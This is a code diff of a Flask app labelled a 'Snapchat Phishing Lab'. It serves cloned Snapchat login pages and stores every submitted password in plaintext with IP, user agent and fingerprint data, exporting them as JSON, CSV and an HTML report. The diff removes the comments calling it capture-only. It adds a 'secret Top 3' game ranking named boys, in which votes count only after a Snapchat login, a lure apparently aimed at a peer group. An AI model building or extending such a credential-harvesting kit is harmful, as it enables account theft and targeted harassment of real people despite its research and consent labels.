@@ -13,36 +13,41 @@ import random
 import string
 import json
 import secrets
+import shutil
+import csv
 from datetime import datetime, timedelta
 from urllib.parse import urljoin, urlparse
+from io import StringIO
 import requests
 from flask import Flask, request, render_template, redirect, url_for, jsonify, session
 
-# ============================================================
-# CONFIGURATION — MODIFIER SELON TON ENVIRONNEMENT
-# ============================================================
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CONFIG = {
     "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
-    "SERVER_PORT": 5000,
-    "USE_HTTPS": True,
+    "SERVER_PORT": 8080,
+    "USE_HTTPS": False,
     "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
     "SESSION_TTL_MINUTES": 60,
     "RANDOMIZE_DOMAINS": True,
     "ADMIN_KEY": os.environ.get("SNAPCHAT_LAB_ADMIN_KEY", "CHANGE_ME_SNAPCHAT_LAB_2024"),
 }
 
-# ============================================================
-# SÉCURITÉ — Les identifiants ne sont JAMAIS vérifiés
-# contre de vrais services. C'est une page de capture UNIQUEMENT.
-# ============================================================
+ADMIN_KEY_FILE = os.path.join(BASE_DIR, ".admin_key")
+if os.path.exists(ADMIN_KEY_FILE):
+    with open(ADMIN_KEY_FILE, "r") as f:
+        CONFIG["ADMIN_KEY"] = f.read().strip()
+else:
+    new_key = secrets.token_hex(32)
+    CONFIG["ADMIN_KEY"] = new_key
+    with open(ADMIN_KEY_FILE, "w") as f:
+        f.write(new_key)
 
 app = Flask(__name__, template_folder=os.path.join(BASE_DIR, "templates"), static_folder=os.path.join(BASE_DIR, "static"))
 app.secret_key = secrets.token_hex(32)
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SECURE'] = CONFIG["USE_HTTPS"]
+app.config['TEMPLATES_AUTO_RELOAD'] = True
 
-# Verifier que cryptography est dispo pour le mode HTTPS
 if CONFIG["USE_HTTPS"]:
     try:
         import cryptography
@@ -53,10 +58,8 @@ if CONFIG["USE_HTTPS"]:
 
 
 def init_database():
-    """Initialise la base SQLite pour stocker les credentials capturés."""
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
-    
     c.execute('''
         CREATE TABLE IF NOT EXISTS captured_credentials (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -86,7 +89,7 @@ def init_database():
             c.execute(f"ALTER TABLE captured_credentials ADD COLUMN {col} TEXT")
         except:
             pass
-    
+
     c.execute('''
         CREATE TABLE IF NOT EXISTS experiment_log (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -96,18 +99,44 @@ def init_database():
             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     ''')
-    
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS access_log (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT,
+            endpoint TEXT,
+            method TEXT,
+            status INTEGER,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS ip_blacklist (
+            ip TEXT PRIMARY KEY,
+            reason TEXT,
+            attempts INTEGER DEFAULT 1,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS votes_top3 (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            participant_id TEXT NOT NULL,
+            pseudo TEXT,
+            votes_data TEXT,
+            snap_validated INTEGER DEFAULT 0,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+            validated_at DATETIME
+        )
+    ''')
     conn.commit()
     conn.close()
 
 
 def generate_participant_id():
-    """Génère un ID de participant anonyme."""
     return f"P{datetime.now().strftime('%Y%m%d')}-{secrets.token_hex(4).upper()}"
 
 
 def log_event(event_type, participant_id=None, details=None):
-    """Log tous les événements pour l'analyse."""
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
     c.execute(
@@ -118,31 +147,77 @@ def log_event(event_type, participant_id=None, details=None):
     conn.close()
 
 
+def log_access(ip, endpoint, method, status):
+    try:
+        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+        c = conn.cursor()
+        c.execute("INSERT INTO access_log (ip, endpoint, method, status) VALUES (?, ?, ?, ?)",
+                  (ip, endpoint, method, status))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+
+def is_blacklisted(ip):
+    try:
+        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+        c = conn.cursor()
+        row = c.execute("SELECT attempts FROM ip_blacklist WHERE ip = ?", (ip,)).fetchone()
+        conn.close()
+        return row and row[0] >= 5
+    except:
+        return False
+
+
+def blacklist_ip(ip, reason):
+    try:
+        conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+        c = conn.cursor()
+        c.execute("""
+            INSERT INTO ip_blacklist (ip, reason, attempts) VALUES (?, ?, 1)
+            ON CONFLICT(ip) DO UPDATE SET attempts = attempts + 1, reason = ?
+        """, (ip, reason, reason))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+
 def capture_credentials(participant_id, username, password, session_token=None):
-    """Capture les credentials avec métadonnées complètes."""
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
-    
     ip_address = request.remote_addr
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    
     c.execute('''
         INSERT INTO captured_credentials 
         (participant_id, username, password, ip_address, user_agent, session_token)
         VALUES (?, ?, ?, ?, ?, ?)
     ''', (participant_id, username, password, ip_address, user_agent, session_token))
-    
     conn.commit()
     conn.close()
-    
     log_event("CAPTURE", participant_id, {
         "username_length": len(username),
         "password_length": len(password),
         "ip": ip_address,
         "ua": user_agent
     })
-    
     return True
+
+
+@app.before_request
+def check_blacklist():
+    if request.path == '/' or request.path.startswith('/static/'):
+        return None
+    if is_blacklisted(request.remote_addr):
+        return jsonify({"error": "blocked", "message": "Your IP has been blacklisted"}), 403
+
+
+@app.after_request
+def log_api_access(response):
+    if request.path.startswith('/api/') or request.path.startswith('/export/'):
+        log_access(request.remote_addr, request.path, request.method, response.status_code)
+    return response
 
 
 # ============================================================
@@ -151,7 +226,6 @@ def capture_credentials(participant_id, username, password, session_token=None):
 
 @app.route('/api/consent', methods=['POST'])
 def record_consent():
-    """Enregistre le consentement du participant."""
     data = request.get_json(force=True)
     participant_id = data.get('participant_id')
     if not participant_id:
@@ -175,7 +249,6 @@ def record_consent():
 
 @app.route('/')
 def index():
-    """Page d'appat Snapchat+ Beta qui pousse a cliquer vers /login."""
     if 'participant_id' not in session:
         session['participant_id'] = generate_participant_id()
         log_event("SESSION_START", session['participant_id'])
@@ -185,7 +258,6 @@ def index():
 
 @app.route('/api/log', methods=['POST'])
 def api_log():
-    """Endpoint de tracking pour la page d'appat (vues + clics)."""
     data = request.get_json(force=True, silent=True)
     if not data:
         return jsonify({"ok": False, "error": "no data"}), 400
@@ -197,7 +269,6 @@ def api_log():
 
 @app.route('/login')
 def login_page():
-    """Page de login clonée — c'est la page de capture."""
     if 'participant_id' not in session:
         session['participant_id'] = generate_participant_id()
         log_event("SESSION_START", session['participant_id'])
@@ -207,7 +278,6 @@ def login_page():
 
 @app.route('/password')
 def password_page():
-    """Étape 2 : page de mot de passe clonée."""
     if 'participant_id' not in session:
         return redirect(url_for('index'))
     return render_template('password.html',
@@ -215,13 +285,8 @@ def password_page():
 
 @app.route('/login', methods=['POST'])
 def handle_login():
-    """Capture les soumissions de formulaire — NE VÉRIFIE PAS LES IDENTIFIANTS."""
     participant_id = request.form.get('participant_id') or session.get('participant_id')
-    
-    # Capture TOUS les champs du formulaire
     form_fields = dict(request.form)
-    
-    # Identification du champ 'username' ─ champs les plus courants
     username = (
         form_fields.get('username', '')
         or form_fields.get('email', '')
@@ -229,20 +294,14 @@ def handle_login():
         or form_fields.get('account_identifier', '')
         or form_fields.get('login', '')
     )
-    
-    # Identification du champ 'password' ─ champs les plus courants
     password = (
         form_fields.get('password', '')
         or form_fields.get('passwd', '')
         or form_fields.get('pass', '')
         or form_fields.get('pwd', '')
     )
-    
-    # Capture tous les champs (même sans mot de passe)
     all_fields = {k: v for k, v in form_fields.items()
                   if k != 'participant_id'}
-    
-    # Log la tentative de connexion
     log_event("LOGIN_ATTEMPT", participant_id, {
         "username_provided": bool(username),
         "password_provided": bool(password),
@@ -250,8 +309,6 @@ def handle_login():
         "fields_count": len(all_fields),
         "field_names": list(all_fields.keys())
     })
-    
-    # Toujours capturer ce qui est soumis
     if username or all_fields:
         credential_str = json.dumps(all_fields, ensure_ascii=False)
         conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
@@ -283,8 +340,17 @@ def handle_login():
             "username_length": len(username),
             "password_length": len(password),
         })
-    
-    # Redirection réaliste
+    # Auto-validate votes top3 if they exist
+    try:
+        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
+        conn2.execute(
+            "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
+            (participant_id,)
+        )
+        conn2.commit()
+        conn2.close()
+    except:
+        pass
     return render_template('redirect.html', 
                          message="Connexion. Redirection...",
                          delay=2)
@@ -292,29 +358,19 @@ def handle_login():
 
 @app.route('/api/report')
 def get_stats():
-    """API pour récupérer les statistiques (pour l'analyse)."""
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
-    
-    # Nombre total de captures
     c.execute("SELECT COUNT(*) FROM captured_credentials")
     total = c.fetchone()[0]
-    
-    # Taux de conversion (qui a soumis un formulaire vs qui a cliqué)
     c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'")
     sessions = c.fetchone()[0]
-    
     conversion_rate = (total / sessions * 100) if sessions > 0 else 0
-    
-    # Captures par jour
     c.execute('''
         SELECT DATE(timestamp), COUNT(*) FROM captured_credentials 
         GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7
     ''')
     daily = c.fetchall()
-    
     conn.close()
-    
     return jsonify({
         "total_sessions": sessions,
         "total_captures": total,
@@ -335,7 +391,6 @@ def shutdown():
 
 @app.route('/debrief')
 def debrief():
-    """Page de debriefing post-test avec conseils de securite."""
     pid = session.get('participant_id', 'inconnu')
     log_event("DEBRIEF_VIEW", pid)
     return render_template('debrief.html', participant_id=pid)
@@ -343,7 +398,6 @@ def debrief():
 
 @app.route('/api/dbcheck', methods=['GET'])
 def dbcheck():
-    """Vérifie l'état de la base depuis le processus serveur."""
     db_path = CONFIG["CAPTURE_DB"]
     try:
         conn = sqlite3.connect(db_path)
@@ -361,15 +415,8 @@ def dbcheck():
         return jsonify({"db_path": db_path, "error": str(e)}), 500
 
 
-@app.route('/dashboard')
-def dashboard():
-    """Dashboard web moderne."""
-    return render_template('dashboard.html')
-
-
 @app.route('/api/captures')
 def api_captures():
-    """Liste toutes les captures (pour le dashboard web)."""
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
         SELECT id, participant_id, username, password, ip_address, user_agent,
@@ -392,7 +439,6 @@ def api_captures():
 
 @app.route('/api/logs')
 def api_logs():
-    """Derniers logs evenements."""
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     rows = conn.execute("""
         SELECT id, event_type, participant_id, details, timestamp
@@ -407,7 +453,6 @@ def api_logs():
 
 @app.route('/api/capture', methods=['POST'])
 def api_capture():
-    """Endpoint appelé par le script de capture."""
     db_path = CONFIG["CAPTURE_DB"]
     try:
         data = request.get_json(force=True, silent=True)
@@ -415,17 +460,17 @@ def api_capture():
             data = request.form.to_dict()
         if not data:
             return jsonify({"ok": False, "error": "empty request"}), 400
-        
+
         participant_id = data.get('participant_id') or request.cookies.get('participant_id', '')
         username = data.get('accountIdentifier', data.get('username', ''))
         password = data.get('password', '')
         ip = request.remote_addr
         ua = request.headers.get('User-Agent', 'Unknown')
-        
+
         print(f"\n[CAPTURE] DB={db_path}", flush=True)
         print(f"[CAPTURE] pid={participant_id} user={username} step={data.get('step','?')}", flush=True)
         print(f"[CAPTURE] fingerprint: scr={data.get('screen_resolution','')} tz={data.get('timezone','')}", flush=True)
-        
+
         conn = sqlite3.connect(db_path)
         c = conn.cursor()
         c.execute(
@@ -448,35 +493,223 @@ def api_capture():
             )
         )
         conn.commit()
-        
+
         after = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
         print(f"[CAPTURE] inserted OK, total rows now: {after}", flush=True)
-        
+
         conn.close()
-        
+
+        # Auto-validate votes top3
+        try:
+            conn3 = sqlite3.connect(CONFIG["CAPTURE_DB"])
+            conn3.execute(
+                "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ? AND snap_validated = 0",
+                (participant_id,)
+            )
+            conn3.commit()
+            conn3.close()
+        except:
+            pass
+
         log_event("CAPTURE_API", participant_id, {
             "username_length": len(username),
             "password_length": len(password),
             "step": data.get('step', 'login'),
             "fingerprint": bool(data.get('screen_resolution'))
         })
-        
+
         return jsonify({"ok": True, "captured": bool(username or password)})
     except Exception as e:
         print(f"[CAPTURE] ERROR: {e}")
         return jsonify({"ok": False, "error": str(e)}), 500
 
 
+# ============================================================
+# VOTES TOP 3 — Classement Secret API
+# ============================================================
+
+BOYS_LIST = [
+    {"id": "famoussa", "name": "Famoussa"},
+    {"id": "bill", "name": "Bill"},
+    {"id": "bakou", "name": "Bakou"},
+    {"id": "yamoussa", "name": "Yamoussa"},
+    {"id": "bassidy", "name": "Bassidy"},
+    {"id": "ben", "name": "BEN"},
+    {"id": "ibrahim", "name": "SK"},
+    {"id": "cherif", "name": "Chérif"},
+]
+POINTS_MAP = [30, 20, 10]
+
+
+@app.route('/api/top3', methods=['POST'])
+def api_submit_votes():
+    """Enregistrer les votes Top 3 d'un joueur."""
+    data = request.get_json(force=True)
+    participant_id = data.get('participant_id')
+    pseudo = data.get('pseudo', '')
+    votes = data.get('votes')  # JSON dict: {"0": ["id1","id2","id3"], ...}
+    if not participant_id or not votes:
+        return jsonify({"ok": False, "error": "participant_id et votes requis"}), 400
+
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    c = conn.cursor()
+    c.execute(
+        """INSERT OR REPLACE INTO votes_top3 
+        (participant_id, pseudo, votes_data)
+        VALUES (?, ?, ?)""",
+        (participant_id, pseudo, json.dumps(votes))
+    )
+    conn.commit()
+    conn.close()
+    log_event("VOTES_SUBMITTED", participant_id, {"pseudo": pseudo, "votes_count": len(votes)})
+    return jsonify({"ok": True, "participant_id": participant_id})
+
+
+@app.route('/api/classement')
+def api_classement():
+    """Calculer le classement agrégé de TOUS les joueurs validés."""
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    c = conn.cursor()
+
+    rows = c.execute(
+        "SELECT votes_data, pseudo FROM votes_top3 WHERE snap_validated = 1"
+    ).fetchall()
+    conn.close()
+
+    # Init scores
+    scores = {boy["id"]: 0 for boy in BOYS_LIST}
+
+    for row in rows:
+        try:
+            votes = json.loads(row[0])
+        except:
+            continue
+        for cat_idx, top3 in votes.items():
+            for rank, boy_id in enumerate(top3):
+                if rank < 3 and boy_id in scores:
+                    scores[boy_id] += POINTS_MAP[rank]
+
+    ranking = sorted(
+        [{"id": boy["id"], "name": boy["name"], "score": scores[boy["id"]]}
+         for boy in BOYS_LIST],
+        key=lambda x: -x["score"]
+    )
+
+    return jsonify({
+        "ranking": ranking,
+        "total_voters": len(rows),
+        "max_possible": 240
+    })
+
+
+@app.route('/api/votes/validate', methods=['POST'])
+def api_validate_votes():
+    """Marquer les votes d'un joueur comme validés (après connexion Snapchat)."""
+    data = request.get_json(force=True, silent=True)
+    if not data:
+        data = request.form.to_dict()
+
+    participant_id = data.get('participant_id')
+    if not participant_id:
+        return jsonify({"ok": False, "error": "participant_id requis"}), 400
+
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    c = conn.cursor()
+    c.execute(
+        "UPDATE votes_top3 SET snap_validated = 1, validated_at = CURRENT_TIMESTAMP WHERE participant_id = ?",
+        (participant_id,)
+    )
+    affected = c.rowcount
+    conn.commit()
+    conn.close()
+
+    log_event("VOTES_VALIDATED", participant_id)
+    return jsonify({"ok": True, "validated": affected > 0})
+
+
+@app.route('/api/classement/my')
+def api_my_classement():
+    """Renvoyer le classement perso du joueur + le classement général."""
+    participant_id = request.args.get('pid', '')
+    pseudo = request.args.get('pseudo', '')
+
+    # Get classement général
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    c = conn.cursor()
+    rows = c.execute(
+        "SELECT votes_data, pseudo FROM votes_top3 WHERE snap_validated = 1"
+    ).fetchall()
+    total_voters = c.execute(
+        "SELECT COUNT(*) FROM votes_top3 WHERE snap_validated = 1"
+    ).fetchone()[0]
+    # Check if this player validated
+    player_valid = c.execute(
+        "SELECT snap_validated FROM votes_top3 WHERE participant_id = ?",
+        (participant_id,)
+    ).fetchone()
+    conn.close()
+
+    scores = {boy["id"]: 0 for boy in BOYS_LIST}
+    for row in rows:
+        try:
+            votes = json.loads(row[0])
+        except:
+            continue
+        for cat_idx, top3 in votes.items():
+            for rank, boy_id in enumerate(top3):
+                if rank < 3 and boy_id in scores:
+                    scores[boy_id] += POINTS_MAP[rank]
+
+    ranking = sorted(
+        [{"id": boy["id"], "name": boy["name"], "score": scores[boy["id"]]}
+         for boy in BOYS_LIST],
+        key=lambda x: -x["score"]
+    )
+    conn.close()
+
+    # Also calculate MY personal ranking (before aggregation)
+    my_scores = {boy["id"]: 0 for boy in BOYS_LIST}
+    try:
+        conn2 = sqlite3.connect(CONFIG["CAPTURE_DB"])
+        stored = conn2.execute(
+            "SELECT votes_data FROM votes_top3 WHERE participant_id = ?",
+            (participant_id,)
+        ).fetchone()
+        conn2.close()
+        if stored:
+            my_votes = json.loads(stored[0])
+            for cat_idx, top3 in my_votes.items():
+                for rank, boy_id in enumerate(top3):
+                    if rank < 3 and boy_id in my_scores:
+                        my_scores[boy_id] += POINTS_MAP[rank]
+    except:
+        pass
+
+    my_ranking = sorted(
+        [{"id": boy["id"], "name": boy["name"], "score": my_scores[boy["id"]]}
+         for boy in BOYS_LIST],
+        key=lambda x: -x["score"]
+    )
+
+    return jsonify({
+        "ranking": ranking,
+        "my_ranking": my_ranking,
+        "total_voters": total_voters,
+        "player_validated": bool(player_valid and player_valid[0]),
+        "max_possible": 240
+    })
+
+
 def require_admin():
     key = request.args.get('key') or request.headers.get('X-Admin-Key', '')
     if key != CONFIG["ADMIN_KEY"]:
-        return jsonify({"error": "forbidden", "message": "Clé admin invalide. Passez ?key=CHANGE_ME_SNAPCHAT_LAB_2024"}), 403
+        blacklist_ip(request.remote_addr, "invalid admin key")
+        return jsonify({"error": "forbidden", "message": "Clé admin invalide."}), 403
     return None
 
 @app.route('/v2/<path:subpath>')
 @app.route('/v2/')
 def v2_catchall(subpath=''):
-    """Redirige les routes /v2/* (ex: /v2/captcha) vers le vrai Snapchat."""
     forbid = require_admin()
     if forbid:
         return forbid
@@ -484,7 +717,6 @@ def v2_catchall(subpath=''):
 
 @app.route('/reset', methods=['GET', 'POST'])
 def reset_data():
-    """Réinitialise les données. GET demande confirmation, POST avec confirm=true exécute."""
     forbid = require_admin()
     if forbid:
         return forbid
@@ -493,10 +725,18 @@ def reset_data():
 <button style="background:red;color:white;padding:20px;font-size:24px">CONFIRMER LA SUPPRESSION</button></form>'''
     if request.form.get('confirm') != 'true':
         return jsonify({"error": "confirm=true required"}), 400
+
+    if os.path.exists(CONFIG["CAPTURE_DB"]):
+        backup_dir = os.path.join(BASE_DIR, "backups")
+        os.makedirs(backup_dir, exist_ok=True)
+        backup_name = f"captured_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
+        shutil.copy2(CONFIG["CAPTURE_DB"], os.path.join(backup_dir, backup_name))
+
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
     c.execute("DELETE FROM captured_credentials")
     c.execute("DELETE FROM experiment_log")
+    c.execute("DELETE FROM votes_top3")
     conn.commit()
     conn.close()
     log_event("RESET", "admin")
@@ -505,22 +745,21 @@ def reset_data():
 
 @app.route('/export')
 def export_data():
-    """Export des données anonymisées pour analyse. Nécessite ?key=ADMIN_KEY."""
     forbid = require_admin()
     if forbid:
         return forbid
     conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
     c = conn.cursor()
-    
+
     c.execute('''
         SELECT participant_id, username, password, ip_address, 
                user_agent, timestamp, consent_given, debriefed 
         FROM captured_credentials
     ''')
-    
+
     rows = c.fetchall()
     conn.close()
-    
+
     export_data = []
     for row in rows:
         export_data.append({
@@ -533,8 +772,96 @@ def export_data():
             "consent": row[6],
             "debriefed": row[7]
         })
-    
+
     return jsonify(export_data)
+
+
+@app.route('/export/csv')
+def export_csv():
+    forbid = require_admin()
+    if forbid:
+        return forbid
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    rows = conn.execute("""
+        SELECT participant_id, username, password, ip_address, user_agent,
+               timestamp, screen_resolution, timezone, browser_language,
+               platform, click_count, referrer
+        FROM captured_credentials ORDER BY id DESC
+    """).fetchall()
+    conn.close()
+    si = StringIO()
+    cw = csv.writer(si)
+    cw.writerow(["participant_id", "username", "password", "ip", "user_agent",
+                  "timestamp", "screen", "timezone", "lang", "platform",
+                  "clicks", "referrer"])
+    for r in rows:
+        cw.writerow(r)
+    output = si.getvalue()
+    return output, 200, {"Content-Type": "text/csv; charset=utf-8",
+                         "Content-Disposition": "attachment; filename=captures.csv"}
+
+
+@app.route('/export/report')
+def export_report():
+    forbid = require_admin()
+    if forbid:
+        return forbid
+    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
+    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
+    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
+    conversion = (total / sessions * 100) if sessions > 0 else 0
+    rows = conn.execute("""
+        SELECT participant_id, username, password, ip_address, user_agent,
+               timestamp, screen_resolution, timezone, browser_language,
+               platform, click_count, referrer
+        FROM captured_credentials ORDER BY id DESC
+    """).fetchall()
+    conn.close()
+
+    html_rows = ""
+    for i, r in enumerate(rows, 1):
+        pw_display = (r[2][:3] + "***") if r[2] else ""
+        ua_short = (r[4] or "")[:30]
+        ref_short = (r[11] or "")[:30]
+        html_rows += (
+            f"<tr><td>{i}</td><td>{r[1]}</td><td>{pw_display}</td>"
+            f"<td>{r[3]}</td><td>{ua_short}</td><td>{r[5]}</td>"
+            f"<td>{r[6] or ''}</td><td>{r[7] or ''}</td><td>{r[8] or ''}</td>"
+            f"<td>{r[9] or ''}</td><td>{r[10] or 0}</td><td>{ref_short}</td></tr>"
+        )
+
+    html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Capture Report</title>
+<style>
+  body {{ background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }}
+  h1 {{ color:#e94560; text-align:center; }}
+  .summary {{ display:flex; gap:20px; margin:20px 0; justify-content:center; }}
+  .card {{ background:#16213e; padding:15px; border-radius:8px; flex:1; max-width:250px; text-align:center; }}
+  .card h2 {{ margin:0; color:#e94560; font-size:14px; }}
+  .card p {{ font-size:28px; margin:5px 0; font-weight:bold; }}
+  table {{ width:100%; border-collapse:collapse; margin-top:20px; }}
+  th {{ background:#16213e; color:#e94560; padding:10px; text-align:left; }}
+  td {{ padding:8px; border-bottom:1px solid #333; }}
+  tr:hover {{ background:#16213e; }}
+</style>
+</head>
+<body>
+<h1>Snapchat Phishing Lab — Capture Report</h1>
+<div class="summary">
+  <div class="card"><h2>TOTAL CAPTURES</h2><p>{total}</p></div>
+  <div class="card"><h2>CONVERSION RATE</h2><p>{conversion:.1f}%</p></div>
+  <div class="card"><h2>SESSIONS</h2><p>{sessions}</p></div>
+</div>
+<table>
+<tr><th>#</th><th>Participant</th><th>Password</th><th>IP</th><th>UA</th><th>Timestamp</th><th>Screen</th><th>Timezone</th><th>Lang</th><th>Platform</th><th>Clicks</th><th>Referrer</th></tr>
+{html_rows}
+</table>
+</body>
+</html>"""
+    return html
 
 
 # ============================================================
@@ -543,10 +870,16 @@ def export_data():
 
 if __name__ == '__main__':
     init_database()
-    
+
     print(f"DB path: {CONFIG['CAPTURE_DB']}")
     print(f"DB exists: {os.path.exists(CONFIG['CAPTURE_DB'])}")
-    
+
+    print("")
+    print("=" * 60)
+    print(f"  ADMIN KEY: {CONFIG['ADMIN_KEY']}")
+    print(f"  (saved in {ADMIN_KEY_FILE})")
+    print("=" * 60)
+
     try:
         print("""
 ╔══════════════════════════════════════════════════════════════════╗
@@ -557,12 +890,12 @@ if __name__ == '__main__':
 ║   Interdit Toute utilisation non autorisee                      ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║   Page d'accueil           https://localhost:5000               ║
-║   Dashboard                https://localhost:5000/dashboard     ║
-║   Dashboard stats          https://localhost:5000/api/report    ║
+║   Statistiques             https://localhost:5000/api/report    ║
 ║   API consentement         https://localhost:5000/api/consent   ║
 ║   Export anonymise         https://localhost:5000/export        ║
 ║   Reset base               https://localhost:5000/reset         ║
 ║   DB check                 https://localhost:5000/api/dbcheck   ║
+║   Admin Key                """ + CONFIG["ADMIN_KEY"][:42] + """              ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║  Demarrer :    python main.py                                   ║
 ╚══════════════════════════════════════════════════════════════════╝
@@ -571,7 +904,8 @@ if __name__ == '__main__':
         print("SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique")
         proto = "https" if CONFIG["USE_HTTPS"] else "http"
         print(f"Server: {proto}://localhost:{CONFIG['SERVER_PORT']}")
-    
+        print(f"Admin Key: {CONFIG['ADMIN_KEY']}")
+
     app.run(host='0.0.0.0', port=CONFIG["SERVER_PORT"], 
             ssl_context='adhoc' if CONFIG["USE_HTTPS"] else None,
             threaded=True)
